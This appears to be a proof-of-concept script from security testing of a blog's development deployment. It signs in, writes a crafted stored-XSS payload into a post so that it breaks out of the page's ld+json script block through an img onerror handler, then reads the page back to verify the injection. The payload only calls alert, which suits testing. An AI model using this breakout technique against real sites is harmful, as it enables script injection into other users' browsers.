// XSS PoC 第二阶段:把正文换成精心构造的 excerpt 注入 payload,再回读页面验证。
import { Torchwood } from '@torchwood/sdk'
import fs from 'node:fs'
import os from 'node:os'

const GATEWAY = 'https://torchwood-dev.deeploop.run'
const SITE = 'https://torchwood-blog-dev.deeploop.run'
const email = process.argv[2]
const password = process.argv[3]
const postId = process.argv[4]
const slug = process.argv[5]

const tw = Torchwood.create({ endpoint: GATEWAY, projectId: 'blog' })
const r = await tw.account.signIn({ email, password })
tw.setAccessToken(r.tokens.access_token)

// payload 设计(经过 excerpt() 变换后仍保留):
//   "</script> <img src=x onerror=alert(document.domain)" —— excerpt 会剥掉 '>',
//   剩 "</script <img src=x onerror=alert(document.domain)" 仍可提前闭合 script 并注入未闭合 img
const payload = 'PWN</script><img src=x onerror=alert(document.domain) x'
const doc = await tw.databases.getDocument('blog', 'posts', postId)
await tw.databases.updateDocument('blog', 'posts', postId, {
  data: { content: payload },
  version: doc.version,
})
console.log('[update] payload written')

await new Promise((res) => setTimeout(res, 1500))
const res = await fetch(`${SITE}/posts/${slug}`)
const html = await res.text()
fs.writeFileSync(`${os.tmpdir()}/xss-post2.html`, html)
const i = html.indexOf('<script type="application/ld+json">')
const block = html.slice(i, html.indexOf('</script>', i) + 9)
console.log('=== 新 ld+json 块 ===')
console.log(block)
console.log()
const after = block.slice(block.indexOf('PWN'))
console.log('=== PWN 之后的内容(将被浏览器解析为 HTML)===')
console.log(after.slice(0, 400))
